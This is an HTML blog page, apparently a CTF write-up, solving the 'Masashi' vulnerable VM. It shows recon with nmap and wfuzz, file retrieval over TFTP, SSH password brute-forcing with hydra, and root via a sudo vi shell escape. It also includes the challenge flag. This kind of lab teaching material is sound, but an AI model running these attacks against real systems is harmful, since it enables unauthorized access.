@@ -1,0 +1,388 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin SEO tag -->
+<title>Masashi | 0bfxgh0st*</title>
+<meta name="generator" content="0bfxgh0st" />
+<meta property="og:title" content="Masashi" />
+<meta name="author" content="0bfxgh0st" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Masashi WriteUp" />
+<meta property="og:description" content="Masashi WriteUp" />
+<link rel="icon" href="/assets/favicon.ico" />
+<link rel="canonical" href="#" />
+<meta property="og:url" content="#" />
+<meta property="og:site_name" content="0bfxgh0st*" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2020-02-25T00:00:00-05:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Masashi" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"0bfxgh0st"},"dateModified":"2020-02-25T00:00:00-05:00","datePublished":"2020-02-25T00:00:00-05:00","description":"Masashi WriteUp","headline":"Welcome To 0bfxgh0st Blog","mainEntityOfPage":{"@type":"WebPage","@id":"#"},"url":"#"}</script>
+<!-- End SEO tag -->
+<link rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="#" title="0bfxgh0st*" /></head><body><header class="site-header"><a class="site-title" rel="author" href="/">0bfxgh0st*</a><nav class="site-nav">
+      <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+      <label for="nav-trigger">
+        <span class="menu-icon">
+          <svg viewBox="0 0 18 15" width="18px" height="15px">
+            <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+          </svg>
+        </span>
+      </label>
+
+      <div class="trigger">
+            <a class="page-link" href="/whoami.html">
+              Whoami
+            </a>
+            <a class="page-link" href="/contact.html">
+              Contact
+            </a></div>
+    </nav><div class="site-icon">
+    <img src="/assets/default-icon.png" />
+  </div>
+
+</header>
+<main class="page-content" aria-label="Content">
+        <div class="wrapper">
+            <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">Masashi</h1>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <p>Port recognition with<code class="language-plaintext highlighter-rouge">nmap</code>or you can use <a href="https://github.com/0bfxgh0st/recon" target="_blank">recon</a></p>
+
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby">┌──(root@ghost)-[/home/ghost]
+└─# <span class="s2">recon</span> masashi.htb
+
+    .o oOOOOOOOo                                            OOOo
+    Ob.OOOOOOOo  OOOo.      oOOo.                      .adOOOOOOO
+    OboO"""""""""""".OOo. .oOOOOOo.    OOOo.oOOOOOo.."""""""""'OO
+    OOP.oOOOOOOOOOOO "POOOOOOOOOOOo.   `"OOOOOOOOOP,OOOOOOOOOOOB'
+    `O'OOOO'     `OOOOo"OOOOOOOOOOO` .adOOOOOOOOO"oOOO'    `OOOOo
+    .OOOO'            `OOOOOOOOOOOOOOOOOOOOOOOOOO'            `OO
+    OOOOO                 '"OOOOOOOOOOOOOOOO"`                oOO
+   oOOOOOba.                .adOOOOOOOOOOba               .adOOOOo.
+  oOOOOOOOOOOOOOba.    .adOOOOOOOOOO@^OOOOOOOba.     .adOOOOOOOOOOOO
+ OOOOOOOOOOOOOOOOO.OOOOOOOOOOOOOO"`  '"OOOOOOOOOOOOO.OOOOOOOOOOOOOO
+ "OOOO"       "YOoOOOOMOIONODOO"`  .   '"OOROAOPOEOOOoOY"     "OOO"
+    Y           'OOOOOOOOOOOOOO: .oOOo. :OOOOOOOOOOO?'         :`
+    :            .oO%OOOOOOOOOOo.OOOOOO.oOOOOOOOOOOOO?         .
+    .            oOOP"%OOOOOOOOoOOOOOOO?oOOOOO?OOOO"OOo
+                 '%o  OOOO"%OOOO%"%OOOOO"OOOOOO"OOO':
+                      `$"  `OOOO' `O"Y ' `OOOO'  o             .
+    .                  .     OP"          : o     .
+                              :
+                              .
+
+[R3C0N] by 0bfxgh0st 4 WWA with ❤
+
+[OS] Linux (99%)
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-12-19 10:50 EST
+NSE: Loaded 1 scripts for scanning.
+NSE: Script Pre-scanning.
+Initiating NSE at 10:50
+Completed NSE at 10:50, 0.00s elapsed
+Initiating ARP Ping Scan at 10:50
+Scanning masashi.vuln (10.0.2.15) [1 port]
+Completed ARP Ping Scan at 10:50, 0.03s elapsed (1 total hosts)
+Initiating SYN Stealth Scan at 10:50
+Scanning masashi.vuln (10.0.2.15) [65535 ports]
+Discovered open port 22/tcp on 10.0.2.15
+Discovered open port 80/tcp on 10.0.2.15
+Completed SYN Stealth Scan at 10:50, 1.51s elapsed (65535 total ports)
+NSE: Script scanning 10.0.2.15.
+Initiating NSE at 10:50
+Completed NSE at 10:50, 0.00s elapsed
+Nmap scan report for masashi.vuln (10.0.2.15)
+Host is up (0.000072s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+MAC Address: 08:00:27:D8:A6:23 (Oracle VirtualBox virtual NIC)
+
+NSE: Script Post-scanning.
+Initiating NSE at 10:50
+Completed NSE at 10:50, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 1.79 seconds
+           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
+
+
+[i] [WHATWEB]
+http://masashi.vuln:80 [200 OK] Apache[2.4.38], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.38 (Debian)], IP[10.0.2.15], Title[Apache2 Debian Default Page: It works]
+
+[+] [WFUZZ]
+*stage 1 --> (light web path fuzzing wordlist:/usr/share/dirb/wordlists/common.txt)
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://masashi.vuln:80/FUZZ
+Total requests: 4614
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                                                                            
+=====================================================================
+
+000000013:   403        9 L      28 W       277 Ch      ".htpasswd"                                                                                                                        
+000000012:   403        9 L      28 W       277 Ch      ".htaccess"                                                                                                                        
+000000011:   403        9 L      28 W       277 Ch      ".hta"                                                                                                                             
+000000001:   200        367 L    928 W      10657 Ch    "http://masashi.vuln:80/"                                                                                                          
+000002020:   200        367 L    928 W      10657 Ch    "index.html"                                                                                                                       
+000003436:   200        5 L      7 W        72 Ch       "robots.txt"                                                                                                                       
+000003588:   403        9 L      28 W       277 Ch      "server-status"                                                                                                                    
+
+Total time: 0
+Processed Requests: 4614
+Filtered Requests: 4607
+Requests/sec.: 0
+
+*stage 2 --> (light permutated extensions fuzzing wordlist:/usr/share/dirb/wordlists/common.txt)
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://masashi.vuln:80/FUZZ.FUZ2Z
+Total requests: 13842
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                                                                            
+=====================================================================
+
+000000001:   403        9 L      28 W       277 Ch      "php"                                                                                                                              
+000000002:   403        9 L      28 W       277 Ch      "html"                                                                                                                             
+000000036:   403        9 L      28 W       277 Ch      ".htaccess - txt"                                                                                                                  
+000000032:   403        9 L      28 W       277 Ch      ".hta - html"                                                                                                                      
+000000035:   403        9 L      28 W       277 Ch      ".htaccess - html"                                                                                                                 
+000000034:   403        9 L      28 W       277 Ch      ".htaccess - php"                                                                                                                  
+000000031:   403        9 L      28 W       277 Ch      ".hta - php"                                                                                                                       
+000000037:   403        9 L      28 W       277 Ch      ".htpasswd - php"                                                                                                                  
+000000038:   403        9 L      28 W       277 Ch      ".htpasswd - html"                                                                                                                 
+000000039:   403        9 L      28 W       277 Ch      ".htpasswd - txt"                                                                                                                  
+000000033:   403        9 L      28 W       277 Ch      ".hta - txt"                                                                                                                       
+000006050:   200        367 L    928 W      10657 Ch    "index - html"                                                                                                                     
+000010305:   200        5 L      7 W        72 Ch       "robots - txt"                                                                                                                     
+000010644:   200        1 L      12 W       54 Ch       "security - txt"                                                                                                                   
+
+Total time: 0
+Processed Requests: 13842
+Filtered Requests: 13828
+Requests/sec.: 0
+</code></pre></figure>
+<p>recon show us port 80 http and port 22 for ssh and a bunch of web server directories to inspect</p>
+
+<p>When I visited default apache web page as shown index.html I noticed some different and relevant word as whoistheplug but let's continue enumeration</p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby">┌──(root@ghost)-[/home/ghost]
+└─# <span class="s2">curl </span>masashi.vuln/security.txt
+If its a bug then let me know on Twitter @lorde_zw :)
+</code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby">┌──(root@ghost)-[/home/ghost]
+└─# <span class="s2">curl </span>masashi.vuln/robots.txt
+User-agent: *
+Disallow: /
+        /snmpwalk.txt
+        /sshfolder.txt
+        /security.txt
+</code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby">┌──(root@ghost)-[/home/ghost]
+└─# <span class="s2">curl </span>masashi.vuln/snmpwalk.txt
+|  403:
+|       Name: cron
+|       Path: /usr/sbin/cron
+|       Params: -f
+|  768:
+|       Name: tftpd
+|       Path: /usr/sbin/tftpd
+|       Params: -- listen — user tftp -- address 0.0.0.0:1337 -- secure /srv/tftp
+|  806:
+|       Name: mysqld
+|       Path: /usr/sbin/mysqld
+|       Params: -i 0.0.0.0
+</code></pre></figure>
+
+<p>We can see a Trivial File Transfer Protocol that is running internally and was not shown in nmap port scan</p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby">┌──(root@ghost)-[/home/ghost]
+└─# <span class="s2">curl </span>masashi.vuln/sshfolder.txt
+sv5@masashi:~/srv/tftp# ls -la
+total 20
+drwx------  2 sv5 sv5 4096 Oct 15 19:34 .
+drwxr-xr-x 27 sv5 sv5 4096 Oct 21 12:37 ..
+-rw-------  1 sv5 sv5 2602 Oct 15 19:34 id_rsa
+-rw-r--r--  1 sv5 sv5  565 Oct 15 19:34 id_rsa.pub
+sv5@masashi:~/srv/tftp#
+</code></pre></figure>
+
+<p>We obtain more information and possible system user called sv5</p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby">┌──(root@ghost)-[/home/ghost]
+└─# <span class="s2">tftp </span>masashi.vuln 1337
+tftp> get id_rsa
+Received 67 bytes in 0.0 seconds
+tftp> get id_rsa.pub
+Received 108 bytes in 0.0 seconds
+tftp> quit
+</code></pre></figure>
+
+<p>We can log to tftp server and extract some files</p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby">┌──(root@ghost)-[/home/ghost]
+└─# <span class="s2">cat </span>id_rsa
+So if you cant use the key then what else can you use????????? :)
+</code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby">┌──(root@ghost)-[/home/ghost]
+└─# <span class="s2">cat </span>id_rsa.pub
+Dude seriously, The key doesnt work here, try the other cewl thing here "/index.html"..... Wink ;) Wink ;)
+</code></pre></figure>
+
+<p>There was no key but the hint is really clear here</p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby">┌──(root@ghost)-[/home/ghost]
+└─# <span class="s2">cewl </span>masashi.vuln/index.html -w wordlist.txt
+CeWL 5.5.2 (Grouping) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
+</code></pre></figure>
+
+<p>Creating a custom wordlist with cewl</p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby">┌──(root@ghost)-[/home/ghost]
+└─# <span class="s2">hydra </span>-l sv5 -P wordlist.txt masashi.vuln ssh -t 4
+Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-12-19 11:26:30
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 240 login tries (l:1/p:240), ~60 tries per task
+[DATA] attacking ssh://masashi.vuln:22/
+[STATUS] 28.00 tries/min, 84 tries in 00:03h, 156 to do in 00:06h, 4 active
+[22][ssh] host: masashi.vuln   login: sv5   password: whoistheplug
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-12-19 11:32:53
+</code></pre></figure>
+
+<p>Cracking ssh password with hydra and obtained credentials</p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby">┌──(root@ghost)-[/home/ghost]
+└─# <span class="s2">ssh </span>sv5@masashi.vuln
+The authenticity of host 'masashi.vuln (10.0.2.15)' can't be established.
+ED25519 key fingerprint is SHA256:T0XjT7hVP1aQLlhHzBRMTeWJf88bwtrXVpVS2jmCqb8.
+This key is not known by any other names
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'masashi.vuln' (ED25519) to the list of known hosts.
+sv5@masashi.vuln's password: 
+Linux masashi 4.19.0-12-amd64 #1 SMP Debian 4.19.152-1 (2020-10-18) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Thu Oct 22 06:39:03 2020
+sv5@masashi:~$ 
+</code></pre></figure>
+
+<p>We are in the system now as user sv5</p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby">sv5@masashi:~$ cat user.txt
+Hey buddy :)
+
+Well done on that initial foothold ;) ;)
+
+Key Takeaways:
+* Do not always believe what the tool tells you, be the "Doubting Thomas" sometimes and look for
+  yourself, e.g 1 disallowed entry in robots.txt wasn't really true was it? hehehehe
+* It's not always about TCP all the time..... UDP is there for a reason and is just as important a
+  protocol as is TCP......
+* Lastly, there is always an alternative to everything i.e the ssh part.
+
+
+***** Congrats Pwner ******
+Now on to the privesc now ;)
+
+
+
+##Creator: Donald Munengiwa
+##Twitter: @lorde_zw
+</code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby">sv5@masashi:~$ sudo -l
+Matching Defaults entries for sv5 on masashi:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User sv5 may run the following commands on masashi:
+    (ALL) NOPASSWD: /usr/bin/vi /tmp/*
+</code></pre></figure>
+
+<p>We can abuse vi and this wildcard</p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby">sv5@masashi:~$ sudo /usr/bin/vi /tmp/file
+~
+~
+~
+
+:!/bin/bash
+
+root@masashi:/home/sv5#
+</code></pre></figure>
+
+<p>After entering :!/bin/bash in vim editor we will get a root shell</p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby">root@masashi:/home/sv5# cat /root/root.txt
+Quite the pwner huh!!!! :)
+
+Well i bet you had fun ;) ;)
+
+Key Takeaways:
+* Well, this time i'll leave it to you to tell me what you though about the overall experience you
+  had from this challenge.
+* Let us know on Twitter @lorde_zw or on linkedIn @Sv5
+
+
+****** Congrats Pwner ******
+If you've gotten this far, please DM your Full name, Twitter Username, LinkedIn Username,
+the flag [th33p1nplugg] and your country to the Twitter handle @lorde_zw ..... I will do a 
+shoutout to all the pnwers who completed the challenge.....
+
+Follow us for more fun Stuff..... Happy Hacktober Pwner (00=[][]=00)
+
+
+
+##Creator: Donald Munengiwa
+##Twitter: @lorde_zw
+</code></pre></figure>
+
+  </div>
+
+  <p class="post-meta"><time class="dt-published" datetime="2020-02-25T00:00:00-05:00" itemprop="datePublished">
+        Dec 19, 2022
+      </time>• 
+        <span itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <span class="p-author h-card" itemprop="name">0bfxgh0st</span></span></p>
+  
+
+  <a class="u-url" href="#" hidden></a>
+</article>
+
+  </div>
+        </div>
+    </main><footer class="site-footer h-card">
+    <data class="u-url" href="/"></data>
+
+    <div class="wrapper">
+
+        <div class="footer">
+
+        </div>
+    </div>
+
+</footer>
+</body>
+
+</html>
